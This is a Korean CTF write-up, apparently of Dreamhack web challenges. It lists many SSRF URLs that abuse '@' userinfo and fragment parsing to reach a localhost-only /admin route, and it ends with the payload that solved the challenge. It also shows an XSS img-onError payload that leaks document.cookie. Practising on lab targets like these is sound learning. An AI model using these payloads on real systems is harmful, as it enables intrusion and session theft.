http://www.google.com/../../flag 
질문 중에 하나는 로컬 환경 어쩌고 하던데 
실제로는 그런 건 전혀 필요 없는 문제이다 
url을 잘 구성하는 것이 이 문제가 원하는 핵심이라고 할 수 있다 
https://umbum.dev/473 참고자료 

http://google.com:80+&@127.88.23.245:22/#+@google.com:80/
http://127.88.23.245:22/+&@google.com:80#+@google.com:80/
http://google.com:80+&@google.com:80#+@127.88.23.245:22/

http://google.com:80+&@google.com:80#+@127.88.23.245:22/admin/ 

http://google.com:80+&@google.com:80#+@127.0.0.1/flag.html
http://google.com:80+&@google.com:80#+@127.0.0.1/../../FLAG
http://google.com:80+&@google.com:80#+@127.0.0.1/admin
http://google.com:3333+&@google.com:80#+@127.0.0.1/admin
http://google.com:80+&@google.com:80#+@127.0.0.1:3333/admin
http://google.com:80+&@google.com:80#+@127.0.0.1:3333/../../admin

똑같이 web으로 구성되어있는 xss2 역시 
try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

<img src='wrongLocation.jpg' onError="location.href='/memo?memo='+document.cookie;" />
페이로드는 이런 식으로 구성되어 있다 

크롤링 역시 
app.flag = '__FLAG__'
이렇게 되어있기는 해도 __ 이런 식으로 답이 나올리가 없다 
위에 있는 내용이 의미하는 것은 아마도 
app.flag를 가동하는 것이 플래그를 얻는 것이다 라는 의미를 말하는 것이라고 보는 것이 정확하다 

@app.route('/admin')
def admin_page():
    if request.remote_addr != '127.0.0.1':
    		return "This is local page!"
    return app.flag
그리고 /admin 함수로 들어가는 것이 app.flag 를 가동하는 것이라는 점을 알 수 있다 

http://doesnt'matter@www.pc-help.org/obsure.htm 
@앞에 오는 것은 무시된다. 원래는 id:pw@url형식으로 사용하도록 되어 있으니까. 

URL: http://google.com:80+&@google.com:80#+@host1.dreamhack.games:12316/admin/
URL: http://google.com:80+@host1.dreamhack.games:12316/admin/
http://google.com:80+@host1.dreamhack.games:12316/../../admin/
http%3A%2F%2Fgoogle.com%3A80%23%2B%40host1.dreamhack.games:20569/admin/

/ 예전에 ../../flag (필터링)를 버프 프록시로 우회했던 기억이 나서 버프 프록시로 하나씩 실행해보았다 
http://google.com:3333+&amp;@google.com:80#+@www.host1.dreamhack.games:20569/../../admin/

다시 기본으로 돌아가보았다 
http://127.0.0.1:3333/#@www.google.com:80/
http://127.0.0.1:3333/?@google.com:80/
http://google.com:80+&@google.com:80#+127.0.0.1:3333/
http://127.0.0.1:3333/+&@google.com:80#+@google.com:80/
http://google.com:80+&@127.0.0.1:3333/#+@google.com:80/

일단 목표지점은 확실히 127.0.0.1:3333이 맞다 
바로 거기에 직접적으로 들어가는 것이 아니더라도 
어쨋든 목표지점은 거기가 맞다 

http://google.com:80@127.0.0.1:3333/admin 
대박 ㅋㅋㅋㅋㅋㅋ 결국에 맞추었다 ㅋㅋㅋㅋㅋ 
진짜 계속 거의 다 왔는데 거의 다 왔는데 그런 느낌이 들었는데 
역시나 정답이었다  
거의 다 왔다는 기분으로 한 번 더 한 번 더 도전했더니 결국엔 풀렸다 
